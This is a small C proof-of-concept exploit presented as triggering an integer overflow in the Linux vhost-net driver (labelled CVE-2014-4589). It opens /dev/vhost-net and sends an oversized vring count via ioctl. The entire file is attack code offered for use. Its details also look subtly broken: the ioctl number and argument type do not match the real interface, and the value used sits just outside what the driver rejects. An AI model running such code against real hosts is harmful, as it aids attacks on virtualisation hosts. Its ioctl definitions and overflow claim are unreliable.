/*
 * PoC for Linux vhost-net VRing size overflow
 * CVE-2014-4589
 *
 * Opens /dev/vhost-net and sets an excessively large vring size,
 * causing an integer overflow in the host vhost_net driver.
 */

#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define VHOST_NET_DEVICE     "/dev/vhost-net"
#define VHOST_SET_VRING_NUM  _IOW(0xAF, 0x00, uint32_t)

int main() {
    int fd = open(VHOST_NET_DEVICE, O_RDWR);
    if (fd < 0) { perror("open vhost-net"); return 1; }

    uint32_t huge = 0x10000;  /* too many descriptors */
    printf("[+] Setting vring num to %u\n", huge);
    if (ioctl(fd, VHOST_SET_VRING_NUM, &huge) < 0)
        perror("ioctl VHOST_SET_VRING_NUM");
    else
        printf("[+] ioctl returned, host vhost-net may overflow\n");

    close(fd);
    return 0;
}